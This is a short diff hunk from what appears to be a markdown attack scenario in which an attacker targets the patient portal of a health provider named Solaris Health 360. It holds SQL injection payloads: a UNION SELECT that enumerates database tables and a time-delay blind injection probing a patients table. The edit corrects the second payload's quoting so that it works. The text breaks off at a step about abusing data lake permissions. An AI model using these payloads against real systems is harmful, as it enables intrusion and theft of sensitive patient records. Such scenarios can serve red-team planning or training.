@@ -15,8 +15,8 @@ The attacker targets Solaris Health 360's patient portal, exploiting vulnerable 
   ```sql
   ' UNION SELECT table_name,2,3 FROM information_schema.tables--
 - Prepare time-delay blind SQLi for stealthy data extraction:
-```sql
-' IF (SELECT COUNT(*) FROM patients) > 1000 WAITFOR DELAY '0:0:5--
+  ```sql
+  ' IF (SELECT COUNT(*) FROM patients) > 1000 WAITFOR DELAY '0:0:5'--
 
 ### Delivery
 Exploit misconfigured data lake permissions to:
